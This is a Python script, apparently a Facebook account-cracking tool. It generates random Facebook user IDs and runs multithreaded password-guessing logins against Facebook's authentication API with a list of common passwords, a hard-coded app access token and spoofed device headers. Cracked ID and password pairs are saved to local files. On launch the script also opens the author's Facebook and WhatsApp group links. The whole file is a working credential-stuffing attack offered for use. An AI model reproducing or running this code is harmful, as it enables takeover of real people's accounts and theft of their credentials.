import os
import marshal
import os,sys,time,json,random,re,string,platform,base64,uuid
#import requests,bs4,datetime,re,urllib3,httpx,mechanize,rich
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as tred 
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install bs4')
sys.stdout.write('\033[38;5;46m\x1b]2; 彡EHC-0499_ᏦᏆΝᏀヅ \x07')
A0="\033[33;1m"
A1="\033[38;5;46m"
A2="\033[37;1m"
A3="\033[33;1m"
A4="\033[38;5;46m"
A5="\033[33;1m"
A6="\033[38;5;46m"
A7="\033[33;1m"
dot2=f' {A1}[{A2}◉{A1}]{A2}'
dot1=f'{A1}[{A2}◉{A1}]{A2}'
Tik=f'{A1}[{A2}√{A1}]{A2}'
ok = []
cp = []
loop=0
user=[]

def ffking_uafb():
    ax = str(random.choice(range(5,7)))
    ac3=str(random.choice(range(1,36)))
    bx3 = str(random.choice(range(8,12)))
    bx4 = str(random.choice(range(552,661)))
    As1=f"Mozilla/5.0 (Windows; U; Windows NT {ax}.1; en-US) AppleWebKit/534.{ac3} (KHTML, like Gecko) Chrome/{bx3}.0.{bx4}.0 Safari/534.{ac3}"
    return (As1)
logo=(f"""
ADMIN---+8801313548349
ADMIN ---Name-Ashikraj
 FOLLOW -MY-FACEBOOK 
                                                                                                                               
 """)
def ffking_404():
	os.system('clear')
	os.system('xdg-open https://www.facebook.com/profile.php?id=61579026299143/')
	os.system('xdg-open https://chat.whatsapp.com/BpFVshrM15W9rBErPkKH8I?mode=ac_t/')
	print(logo)
	print(f"{A1}╔════════════════════════════════════════════════╗")
	print(f"{A1}║ {dot1}{A6} ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ {A2}: {A6}[{A2}30000{A6}] [{A2}40000{A6}] [{A2}50000{A6}] {A1}║")
	print(f"{A1}╚════════════════════════════════════════════════╝")
	limit = int(input(f" {dot2} ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ :{A6} "))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(10))
		user.append(nmp)
	with tred(max_workers=30) as fbck:
		fbcx = "10000"
		os.system("clear")
		print(logo)
		tl = str(len(user))
		
		for fbc in user:
			uid = str(fbcx+fbc)
			pas = ['71943102','123456','@mgkhan8','82569194','@robinhossain','123123','romaldagaga91','70135829','mdnirob@357','1234567','mstjannat@11','81047921','mdrakib@15772','12345678','mimislam@46','21057925','emran@002775','123456789','mdkhan@11','89253379','528802746','96431071','5271919537','7651792','123456','527829965189','57801916','60966190','2238996','66891854','52781965418','518995428','518899174','01854929']		 
			fbck.submit(Fbcrack,uid,pas,tl)
	


def Fbcrack(uid,pas,tl):
	global loop,ok,cp
	Emj=random.choice(['🥰','🤣','🤭','😜','😁','🤫','😃','😝','😀','🥱','😎','😴','😍','😊','😄','☺️','😙','🙀','🤪','😵','👻','🙈','💖','😋'])
	Emoj=random.choice(['🤭','🥰','🤣','🤭','😜','😁','🤫','😃','😝','😀','🥱','😎','😴','😍','😊','😄','☺️','😙','🙀','🤪','😵','👻','🙈','💖','😋'])
	Emojx=random.choice(['🤣','🥰','🔥','😁','😍','😮','😎','😝','🙈','😁','😜','😵','👻','😃'])
	Clorhx=random.choice([f'🥰{A1}',f'😝{A2}',f'🤭{A6}',f'😃{A4}',f'🤫{A5}',f'🤣{A6}',f'😁{A7}',f'😜{A0}'])
	sys.stdout.write(f'\r {A1}[{Clorhx}CLONE{A1}]{Emoj}[{A6}%s{A1}]{Emj}[{A2}CP-LOCK-%s{A1}]{Emojx}[{A2}LOGING✅%s{A1}]\r'%(loop,len(ok),len(cp)))
	sys.stdout.flush()
	try:
		for ps in pas:
			with requests.Session() as session:
				headers={'x-fb-connection-bandwidth': str(random.randint(20000000,30000000)),
				'x-fb-sim-hni': str(random.randint(20000, 40000)),
				'x-fb-net-hni': str(random.randint(20000, 40000)),
				'x-fb-connection-quality': 'EXCELLENT',
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
				'user-agent': ffking_uafb(),
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-http-engine': 'Liger'}
				po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
				if "www.facebook.com" in str(po):
					print(f'{A6}[{A2}RAJ -{A1}OK{A6}]{A2} {uid} {A6}<>{A2} {ps}')
					open("/sdcard/RAJ-404_RAJ-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					cp.append(uid)
					break
				elif "access_token" in po:
					print(f'{A6}[{A2}RAJ -CP-LOCK😭{A6}]{A2} {uid} {A6}<>{A2} {ps}')
					open("/sdcard/RAJ-404_RAJ-CP-LOCK😭.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					ok.append(uid)
					break
				else:pass
			loop+=1
	except Exception as e:pass


ffking_404()